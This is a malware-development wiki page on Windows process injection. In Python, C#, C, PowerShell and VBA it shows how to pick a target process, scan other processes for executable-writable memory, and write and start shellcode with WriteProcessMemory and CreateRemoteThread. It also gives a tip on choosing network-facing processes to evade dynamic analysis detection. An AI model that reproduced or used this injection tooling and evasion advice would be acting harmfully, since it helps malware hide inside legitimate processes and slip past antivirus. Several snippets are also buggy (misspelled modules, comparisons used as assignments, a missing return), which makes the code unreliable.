---
author(s):
  - Userware
tags:
  - malware-development
  - implant-execution
  - process-injection
  - windows
---
# Inject Existing Process

## Get Process Candidate

### Scripting

#### Python

```python
import os
import psutils
import random

def get_process(preferred='svchost.exe'):
	'''Enumerates to check if the process exists then the PID will return.'''
	domain = os.getenv('USERDOMAIN')
	name = os.getenv('USERNAME')
	username = '{}\\{}'.format(domain, name).lower()

	candidates = {}
	for process_identifier in psutils.pids():
		pid = psutil.Process(process_identifier)
		try:
			name = pid.name()
			process_user = pid.username().lower()
		except:
			continue
		
		if process_user == username and name.lower() == preferred:
			candidates[process_identifier] == name
	choice = random.choice(list(candidates.keys()))
	print('[*] Selected Process ID: {} ({}) to Inject'.format(
		choice, candidates[choice]
	))
	
	return int(choice)
```

### .NET

#### C\#

```cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class RetrieveProcess {
    [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

	static void Main(string[] args) {
        string processName = "notepad";
        uint processId = GetProcessName(processName);
        if (processId != 0)
            Console.WriteLine($"Selected process ID: {processId}");
        else
            Console.WriteLine("No matching process found.");
	}

	private static bool is64bit(Process process_identifier) {
		IsWow64Process(process_identifier.Handle, out bool is64);
		return !is64;
	}

	private static uint GetProcessName(string process_name) {
		Process[] processes = Process.GetProcesses();
		Dictionary<int, string> candidates = new Dictionary<int, string>();
		foreach (Process process in processes) {
			try {
				if (process.Threads[0].ThreadState == ThreadState.Standby ||
					process.Id == Process.GetCurrentProcess().Id)
					continue;
				else if (IntPtr.Size == 8 && is64bit(process))
					candidates.Add(process.Id, $"{process.ProcessName}:x64");
				else if (IntPtr.Size == 8 && !is64bit(process))
					candidates.Add(process.Id, $"{process.ProcessName}:x32");
				else if (IntPtr.Size == 4 && !is64bit(process))
					candidates.Add(process.Id, $"{process.ProcessName}:x32");
			} catch { continue;}
		}
	}
}
```

Another variant using WMI object to retrieve the process name.

```cs
using System;
using System.Collections.Generic;
using System.Management;
using System.Security.Principal;

public class RetrieveProcess {
	static void Main(string[] args) {
        string processName = "notepad";
        uint processId = GetProcessName(processName);
        if (processId != 0)
            Console.WriteLine($"Selected process ID: {processId}");
        else
            Console.WriteLine("No matching process found.");
	}

	private static uint GetProcessName(string process_name) {
        string current_user = WindowsIdentity.GetCurrent().Name.ToLower();
        string wql = "SELECT * FROM Win32_Process";
        ManagementObjectSearcher ms = new ManagementObjectSearcher(wql);
        ManagementObjectCollection moc = ms.Get();
        var candidates = new List<uint>();
        Random random = new Random();
		
		foreach (ManagementObject mo in moc) {
			try {
				string[] o = new string[] { string.Empty, string.Empty };
				if ((UInt32)mo.InvokeMethod("GetOwner", o) > 0) continue;
				string owner = (o[1] + "\\" + o[0]).ToLower();
				UInt32 process_identifier = (UInt32)mo.GetPropertyValue("ProcessId");
				string proc_name = (string)mo.GetPropertyValue("Name");
				if (proc_name.ToLower() == process_name.ToLower() && current_user == owner)
					candidates.Add(process_identifier);
			} catch { continue; }
		}
	
		if (candidates.Count > 0)
			return candidates[random.Next(candidates.Count)];
	
		return 0;
	}
}
```

### WinAPI

#### C

```c
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <tchar.h>

LPVOID Hunt(DWORD processID) {
    HMODULE hMod;
    DWORD cbNeeded;
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processID);
    if (EnumProcessModules(process, &hMod, sizeof(hMod),
        &cbNeeded)) {
        GetModuleBaseName(process, hMod, szProcessName,
         sizeof(szProcessName) / sizeof(TCHAR));
   }  
   if (process) {  
      _tprintf(TEXT("[*] Searching in %s  (PID: %u)..."), szProcessName, processID);

		long MaxAddress = 0x7fffffff;
		long address = 0;
        int c = 0;
        do {
            MEMORY_BASIC_INFORMATION m;

            int result = VirtualQueryEx(process, (LPVOID)address, &m, sizeof(MEMORY_BASIC_INFORMATION));
            if (m.AllocationProtect == PAGE_EXECUTE_READWRITE) {
                printf("YAAY - RWX found at 0x%x\n", m.BaseAddress);
                return m.BaseAddress;
            } else if(c > 50000 ){
                printf(".");
                c = 0;
            } else {
                c += 1;
            }
            if (address == (long)m.BaseAddress + (long)m.RegionSize)
                break;
            address = (long)m.BaseAddress + (long)m.RegionSize;
        } while (address <= MaxAddress);

        printf("Nope\n");
    } else {  
        _tprintf(TEXT("[*] No Access for %s  (PID: %u) \n"), szProcessName, processID); 
    }

    return 0;  
}
```

## Inject Process

### WinAPI

> [!NOTE]
> `PROCESS_ALL_ACCESS` isn't required. Only `PROCESS_CREATE_PROCESS` or `0x00000028` (both `PROCESS_QUERY_INFORMATION` and `PROCESS_VM_READ`) is efficient.
> > [!TIP] Evade Dynamic Analysis Detection
> > Only inject processes that connects to the internet such as, a **web browser** or any anything communicates through the network. Injecting the payload through a **text editor** for example, will raise the alarms due to lack of socket networks. However, when unexpected circumstances may occur then implement it as a last resort.

### PowerShell

```powershell
$Win32Functions = New-Object System.Object

$OpenProcessAddress = Get-ProcAddress kernel32.dll OpenProcess
$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddress, $OpenProcessDelegate)
$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
```

### VBA

```vb
Const PROCESS_ALL_ACCESS = &H1F0FFF

Dim handle As LongPtr
Dim PID As Integer

PID = 4444
handle = OpenProcess(PROCESS_ALL_ACCESS, False, PID)
```

### C

```c
void Exec(LPVOID address, DWORD processID) {
    char shellcode[] = "";

    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    WriteProcessMemory(procHandle, address, shellcode, sizeof(shellcode), 0);

    // hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
    LPVOID hThread = CreateRemoteThread(procHandle, 0, 0, (LPVOID)(address), 0, 0, 0);
}

int main()
{
    printf("Starting Search \n");
    //Boolean spaceFound = false;
    LPVOID spaceAddress = 0;
    // Search in current process takes forever in C, skipping for this PoC
    DWORD currentProc = GetCurrentProcessId();
    printf("Current PID: %d", (int)currentProc);
    // spaceAddress = Hunt(currentProc);
    if (spaceAddress > 0) {
        //Exec(spaceAddress, currentProc);
    }
    else {
        DWORD aProcesses[1024], cbNeeded, cProcesses;
        unsigned int i;
        EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);
        cProcesses = cbNeeded / sizeof(DWORD);

        // Print the name and process identifier for each process.

        for (i = 0; i < cProcesses; i++)
        {
            if (aProcesses[i] != 0 && aProcesses[i] != currentProc)
            {
                spaceAddress = Hunt(aProcesses[i]);
                if (spaceAddress > 0) {
                    Exec(spaceAddress, aProcesses[i]);
                    break;
            }
            }
        }
    }

    // sleep for a second to wait for the thread
    Sleep(10000);
    return 0;
}
```

---
## References

### Source Repositories

- [Chvancooten: Process Injector](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Injector)

### Tenouk

- [Tenouk: Processes and Threads - WinAPIs - Part 6](https://www.tenouk.com/ModuleU.html)

- [Tenouk: Processes and Threads - WinAPIs - Part 7](https://www.tenouk.com/ModuleU1.html)

- [Tenouk: Processes and Threads - WinAPIs - Part 10](https://www.tenouk.com/ModuleU4.html)

### Hackmosphere

- [Hackmosphere: Bypass Windows Defender antivirus in 2025 - Evasion Techniques Using Direct Syscalls and XOR encryption - Part 2](https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/)